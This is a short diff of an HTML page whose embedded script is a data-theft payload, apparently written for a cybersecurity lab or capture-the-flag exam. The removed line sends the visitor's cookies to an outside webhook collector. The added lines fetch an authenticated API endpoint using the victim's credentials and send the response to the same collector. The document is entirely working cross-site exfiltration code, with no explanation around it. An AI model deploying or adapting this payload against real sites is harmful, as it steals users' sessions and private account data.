@@ -2,7 +2,13 @@
 <html>
   <body>
     <script>
-      (new Image()).src = "https://webhook.site/c8da1079-71fd-4a7a-9869-fcf75dfd6c66?cookie=" + encodeURIComponent(document.cookie);
+      fetch("https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/api/user", {
+        credentials: "include"
+      })
+      .then(r => r.text())
+      .then(res => {
+        (new Image()).src = "https://webhook.site/c8da1079-71fd-4a7a-9869-fcf75dfd6c66?html=" + encodeURIComponent(res);
+      });
     </script>
   </body>
 </html>
